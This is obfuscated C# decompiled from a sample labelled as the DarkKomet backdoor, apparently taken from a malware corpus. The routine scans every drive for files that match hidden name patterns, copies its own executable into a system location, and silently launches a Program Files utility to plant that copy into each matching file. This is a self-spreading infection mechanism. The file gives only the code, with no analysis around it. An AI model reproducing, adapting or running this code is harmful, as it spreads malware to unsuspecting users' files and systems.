// Decompiled with JetBrains decompiler
// Type:  
// Assembly: AudioHD, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C44212F0-6FD7-4886-BEB4-F43F84F3B277
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Backdoor.Win32.DarkKomet.hzfh-26a1c6d83f8e03a282b89acec8aef19eabb2f72745381a243a94811e2d7d3cb6.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

public sealed class \u0005\u2002
{
  public static int \u0002 = 0;
  private static string \u0003;
  private static string \u0005;

  [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
  public static extern int GetShortPathName([MarshalAs(UnmanagedType.LPTStr)] string _param0, [MarshalAs(UnmanagedType.LPTStr)] StringBuilder _param1, int _param2);

  private static void \u0002(string _param0)
  {
    foreach (string file in Directory.GetFiles(_param0))
    {
      if (file.Contains(\u0006\u2002.\u0002(-885880153)))
        \u0005\u2002.\u0005(file);
      if (file.Contains(\u0006\u2002.\u0002(-885880168)))
        \u0005\u2002.\u0005(file);
    }
    foreach (string directory in Directory.GetDirectories(_param0))
      \u0005\u2002.\u0002(directory);
  }

  public static void \u0003(string _param0)
  {
    \u0005\u2002.\u0005 = _param0;
    foreach (string logicalDrive in Environment.GetLogicalDrives())
      \u0005\u2002.\u0002(logicalDrive);
  }

  public static void \u0005(string _param0)
  {
    string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
    string path1 = folderPath.Replace(folderPath.Substring(folderPath.IndexOf(\u0006\u2002.\u0002(-885875661))), string.Empty) + \u0006\u2002.\u0002(-885875661);
    \u0005\u2002.\u0003 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + \u0006\u2002.\u0002(-885880179);
    if (!File.Exists(\u0005\u2002.\u0003))
      return;
    if (!File.Exists(Path.Combine(path1, \u0005\u2002.\u0005)))
      File.Copy(Process.GetCurrentProcess().MainModule.FileName, Path.Combine(path1, \u0005\u2002.\u0005));
    StringBuilder stringBuilder1 = new StringBuilder((int) byte.MaxValue);
    \u0005\u2002.GetShortPathName(Path.Combine(path1, \u0005\u2002.\u0005), stringBuilder1, stringBuilder1.Capacity);
    string str1 = stringBuilder1.ToString();
    StringBuilder stringBuilder2 = new StringBuilder((int) byte.MaxValue);
    \u0005\u2002.GetShortPathName(_param0, stringBuilder2, stringBuilder2.Capacity);
    try
    {
      ProcessStartInfo startInfo = new ProcessStartInfo();
      string str2 = \u0006\u2002.\u0002(-885880076) + (object) stringBuilder2 + \u0006\u2002.\u0002(-885876484) + str1;
      startInfo.FileName = \u0005\u2002.\u0003;
      startInfo.Arguments = str2;
      startInfo.WindowStyle = ProcessWindowStyle.Hidden;
      Process.Start(startInfo);
      ++\u0005\u2002.\u0002;
    }
    catch
    {
    }
  }
}
